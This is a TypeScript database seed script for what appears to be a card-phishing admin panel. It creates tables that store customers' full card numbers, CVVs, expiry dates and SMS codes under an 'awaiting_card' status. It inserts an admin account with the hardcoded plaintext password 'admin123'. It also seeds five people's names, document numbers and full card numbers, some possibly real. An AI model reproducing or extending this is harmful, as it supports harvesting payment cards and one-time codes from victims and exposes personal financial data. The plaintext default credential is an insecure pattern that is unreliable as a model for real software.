import { db } from "./index";
import * as schema from "@shared/schema";
import { formatDocument, formatCardNumber } from "../client/src/lib/utils";

async function seed() {
  try {
    console.log("Seeding database...");

    // Check if admins table exists, if not create it
    await db.execute(/*sql*/`
      CREATE TABLE IF NOT EXISTS admins (
        id TEXT PRIMARY KEY NOT NULL DEFAULT gen_random_uuid(),
        username TEXT NOT NULL UNIQUE,
        password TEXT NOT NULL,
        created_at TIMESTAMP NOT NULL DEFAULT NOW()
      );
    `);

    // Check if customers table exists, if not create it
    await db.execute(/*sql*/`
      CREATE TABLE IF NOT EXISTS customers (
        id TEXT PRIMARY KEY NOT NULL DEFAULT gen_random_uuid(),
        name TEXT NOT NULL,
        document TEXT NOT NULL UNIQUE,
        formatted_document TEXT NOT NULL,
        card_number TEXT NOT NULL,
        masked_card_number TEXT NOT NULL,
        expiry_date TEXT,
        cvv TEXT,
        sms_code TEXT,
        status TEXT DEFAULT 'awaiting_card',
        session_id TEXT,
        created_at TIMESTAMP NOT NULL DEFAULT NOW(),
        updated_at TIMESTAMP NOT NULL DEFAULT NOW()
      );
    `);

    // Create admin user if not exists
    const adminExists = await db.query.admins.findFirst({
      where: (admins, { eq }) => eq(admins.username, "admin")
    });

    if (!adminExists) {
      console.log("Creating admin user...");
      await db.insert(schema.admins).values({
        username: "admin",
        password: "admin123"
      });
    }

    // Sample customer data
    const sampleCustomers = [
      {
        name: "PAULO VITOR MYNSSEN DA SILVA",
        document: "08814399750",
        cardNumber: "4334870072932200"
      },
      {
        name: "MARIA SILVA SANTOS",
        document: "12345678900",
        cardNumber: "5196837542154890"
      },
      {
        name: "JOÃO PEDRO OLIVEIRA",
        document: "98765432100",
        cardNumber: "3715849302761540"
      },
      {
        name: "ANA CLARA FERREIRA",
        document: "45678912300",
        cardNumber: "6011785436921450"
      },
      {
        name: "LUCAS MARTINS COSTA",
        document: "78945612300",
        cardNumber: "3528419675301482"
      }
    ];

    // Add customers
    for (const customer of sampleCustomers) {
      const exists = await db.query.customers.findFirst({
        where: (customers, { eq }) => eq(customers.document, customer.document)
      });

      if (!exists) {
        console.log(`Creating customer: ${customer.name}`);
        await db.insert(schema.customers).values({
          name: customer.name,
          document: customer.document,
          formattedDocument: formatDocument(customer.document),
          cardNumber: customer.cardNumber,
          maskedCardNumber: formatCardNumber(customer.cardNumber),
          status: "awaiting_card"
        });
      }
    }

    console.log("Seed completed successfully!");
  } catch (error) {
    console.error("Error seeding database:", error);
  }
}

seed();
